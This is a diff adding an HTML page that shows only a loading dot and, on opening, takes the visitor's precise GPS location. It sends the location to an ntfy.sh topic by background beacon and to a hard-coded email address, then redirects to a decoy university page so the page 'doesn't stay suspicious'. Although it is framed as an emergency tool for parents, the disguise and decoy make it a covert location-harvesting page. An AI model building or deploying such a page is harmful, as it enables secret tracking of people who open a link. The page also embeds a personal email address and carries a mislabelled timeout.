@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #d0d0d0;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+        .status {
+            font-size: 0.7rem;
+            color: #a0a0a0;
+            display: none;
+            text-align: center;
+            max-width: 200px;
+        }
+    </style>
+</head>
+<body>
+    <div class="dot" id="dot"></div>
+    <div class="status" id="status"></div>
+
+    <script>
+        (function() {
+            // ============================================================
+            //  CONFIGURATION – EDIT THESE VALUES (keep them secret)
+            // ============================================================
+            const PARENT_EMAIL = 'baraiayush366@Gmail.com';     // ← Replace with your parents' real email
+            const NTFY_TOPIC   = 'Location_Notify';    // ← Replace with a long, random string (e.g., 'fam7xq2k9m')
+            const DECOY_URL    = 'https://www.iitb.ac.in/';      // ← Innocent page to show after sending (e.g., google.com, or about:blank)
+            const LOCATION_TIMEOUT = 1000000;                  // 10 seconds – enough for a GPS fix
+            // ============================================================
+
+            const statusEl = document.getElementById('status');
+            const dotEl = document.getElementById('dot');
+
+            function showStatus(text, color = '#a0a0a0') {
+                statusEl.textContent = text;
+                statusEl.style.color = color;
+                statusEl.style.display = 'block';
+                if (dotEl) dotEl.style.display = 'none';
+            }
+
+            function buildMessage(lat, lng, accuracy) {
+                const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
+                const time = new Date().toLocaleString();
+                return {
+                    full: 
+                        `📍 Emergency Location\n` +
+                        `Latitude:  ${lat.toFixed(6)}\n` +
+                        `Longitude: ${lng.toFixed(6)}\n` +
+                        `Accuracy:  ±${Math.round(accuracy)} meters\n` +
+                        `Time:      ${time}\n` +
+                        `Map:       ${mapsUrl}`,
+                    mapsLink: mapsUrl
+                };
+            }
+
+            // -----------------------------------------------------------------
+            // Ntfy – send via sendBeacon (survives page unload)
+            // -----------------------------------------------------------------
+            function sendNtfyBeacon(lat, lng, accuracy) {
+                if (!NTFY_TOPIC || NTFY_TOPIC === 'fam7xq2k9m_Secret123') {
+                    console.log('ntfy topic not configured – skipping.');
+                    return false;
+                }
+                const msg = buildMessage(lat, lng, accuracy).full;
+                const url = `https://ntfy.sh/${NTFY_TOPIC}`;
+
+                // Build a Blob with the message body
+                const blob = new Blob([msg], { type: 'text/plain' });
+
+                // sendBeacon returns true if the request is queued successfully
+                return navigator.sendBeacon(url, blob);
+            }
+
+            // -----------------------------------------------------------------
+            // Email – opens the default email client
+            // -----------------------------------------------------------------
+            function sendEmail(lat, lng, accuracy) {
+                const msg = buildMessage(lat, lng, accuracy).full;
+                const subject = encodeURIComponent('📍 Emergency Location');
+                const body = encodeURIComponent(msg);
+                const mailto = `mailto:${PARENT_EMAIL}?subject=${subject}&body=${body}`;
+                // Navigate to mailto – this will open the email app
+                window.location.href = mailto;
+            }
+
+            // -----------------------------------------------------------------
+            // Redirect to decoy page after a short delay
+            // -----------------------------------------------------------------
+            function redirectToDecoy() {
+                setTimeout(() => {
+                    if (DECOY_URL && DECOY_URL.trim() !== '') {
+                        window.location.replace(DECOY_URL);
+                    }
+                }, 1200); // 1.2 seconds – gives email app time to take over
+            }
+
+            async function main() {
+                if (!navigator.geolocation) {
+                    showStatus('GPS not supported', '#c0392b');
+                    return;
+                }
+
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: LOCATION_TIMEOUT,
+                            maximumAge: 0
+                        });
+                    });
+
+                    const { latitude, longitude, accuracy } = position.coords;
+
+                    // 1. Fire ntfy via sendBeacon (guaranteed background delivery)
+                    const beaconSent = sendNtfyBeacon(latitude, longitude, accuracy);
+                    if (beaconSent) {
+                        console.log('ntfy beacon queued.');
+                    }
+
+                    // 2. Open email client
+                    sendEmail(latitude, longitude, accuracy);
+
+                    // 3. Prepare the decoy redirect
+                    redirectToDecoy();
+
+                } catch (error) {
+                    let msg = 'Location unavailable';
+                    if (error.code === error.PERMISSION_DENIED) msg = 'Location denied. Please allow GPS.';
+                    else if (error.code === error.TIMEOUT) msg = 'GPS timeout – try again';
+                    else if (error.code === error.POSITION_UNAVAILABLE) msg = 'No GPS signal';
+                    showStatus(msg, '#c0392b');
+
+                    // Even on error, redirect to decoy after a moment so the page doesn't stay suspicious
+                    setTimeout(() => {
+                        if (DECOY_URL && DECOY_URL.trim() !== '') {
+                            window.location.replace(DECOY_URL);
+                        }
+                    }, 2000);
+                }
+            }
+
+            // Start immediately – the tap that opened this page is the user gesture
+            main();
+        })();
+    </script>
+</body>
+</html>
